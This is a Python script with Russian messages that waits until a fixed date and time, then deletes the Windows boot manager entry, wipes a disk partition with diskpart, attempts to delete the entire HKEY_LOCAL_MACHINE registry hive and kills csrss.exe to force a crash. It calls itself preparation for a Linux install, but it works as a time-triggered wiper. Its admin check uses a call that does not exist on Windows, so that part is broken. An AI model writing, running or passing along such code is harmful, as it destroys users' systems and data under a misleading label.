import os
import subprocess
import sys
import time
from datetime import datetime

def run_command(command):
    print(f"Выполнение команды: {command}")
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    if process.returncode == 0:
        print(stdout.decode('utf-8'))
    else:
        print(f"Ошибка: {stderr.decode('utf-8')}")
        sys.exit(1)

def delete_bcd_entry():
    print("Удаление записи загрузчика Windows (BCD)...")
    run_command("bcdedit /delete {bootmgr}")

def clean_disk():
    print("Очистка C: диска с помощью diskpart...")
    script = '''select disk 0
select partition 1
clean
'''
    script_path = "clean_disk_script.txt"
    with open(script_path, 'w') as f:
        f.write(script)
    
    run_command(f"diskpart /s {script_path}")
    os.remove(script_path)

def delete_windows_registry_keys():
    print("Удаление всех ключей реестра Windows...")
    registry_key = r"HKEY_LOCAL_MACHINE"
    
    print(f"Удаление всего реестра {registry_key}")
    run_command(f"reg delete \"{registry_key}\" /f /s /va")

def trigger_bsod():
    print("Вызов синего экрана смерти...")
    run_command("taskkill /f /im csrss.exe")

def wait_until_target_time():
    target_time = "2024-12-31 23:59:59"
    print(f"Ожидаю время {target_time} для выполнения действий...")
    
    while True:
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        if current_time == target_time:
            print(f"Время наступило! ({current_time})")
            return
        time.sleep(1)

def main():
    wait_until_target_time()
    print("Запуск скрипта для удаления следов Windows...")
    
    delete_bcd_entry()
    clean_disk()
    delete_windows_registry_keys()
    trigger_bsod()

    print("Процесс завершен. Ваш диск подготовлен для установки Linux.")

if __name__ == "__main__":
    if not os.geteuid() == 0:
        print("Этот скрипт нужно запускать с правами администратора!")
        sys.exit(1)

    main()
